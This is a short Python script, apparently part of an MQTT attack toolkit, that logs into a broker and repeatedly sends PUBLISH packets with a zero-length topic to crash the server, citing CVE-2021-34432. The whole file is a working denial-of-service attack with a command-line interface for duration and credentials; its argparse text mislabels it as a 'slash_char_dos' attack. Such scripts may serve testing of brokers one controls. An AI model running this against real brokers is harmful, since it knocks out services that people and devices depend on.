import argparse
import random

import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time

def main(username, password, duration=10):
    """The zero length attack sends a PUBLISH packet where the topic has length zero to cause the server to crash by exploiting CVE-2021-34432"""

    reconnect_delay = 10
    connection = util.Connection_status()
    start_time = time.time()

    while True:

        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, userdata={"connection":connection}, protocol=mqtt.MQTTv311)
        client.username_pw_set(username, password)
        client.on_connect = util.on_connect
        client.on_disconnect = util.on_disconnect
        client.on_publish = util.on_publish
        if util.connect_client(client, connection, reconnect_delay):
            client.publish("", "whatever")
            print("Sent malformed PUBLISH packet")
            time.sleep(0.2 * random.randint(1, 2))
            client.disconnect()
        else:
            print(f"Resetting client and retrying connection in {reconnect_delay} seconds...", flush=True)
            time.sleep(reconnect_delay)
        elapsed_time = time.time() - start_time
        print("Execution time: " + str(elapsed_time))
        if elapsed_time >= duration:
            print("Time elapsed")
            return


if __name__=="__main__":
    parser = argparse.ArgumentParser(description="launch a slash_char_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    args = parser.parse_args()
    main(args.username, args.password, args.duration)